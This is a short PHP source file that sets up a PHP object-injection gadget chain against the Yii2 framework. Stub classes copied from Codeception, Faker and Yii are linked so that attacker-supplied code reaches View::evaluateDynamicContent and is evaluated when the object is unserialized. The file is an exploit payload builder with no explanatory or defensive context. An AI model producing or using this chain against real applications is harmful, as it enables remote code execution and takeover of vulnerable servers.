<?php
namespace Codeception\Extension {
    class RunProcess {
        private $processes = [];

        public function __construct($code)
        {
            $this->processes = [new \Faker\ValidGenerator($code)];
        }
    }
}

namespace Faker {
    class ValidGenerator {
        protected $generator;
        protected $validator;
        protected $maxRetries;

        public function __construct($code)
        {
            $this->generator = new DefaultGenerator($code);
            $this->maxRetries = 1;
            $this->validator = [new \yii\base\View(), "evaluateDynamicContent"];
        }
    }

    class DefaultGenerator {
        protected $default;

        public function __construct($code)
        {
            $this->default = $code;
        }
    }
}

namespace yii\base {
    class View {}
}
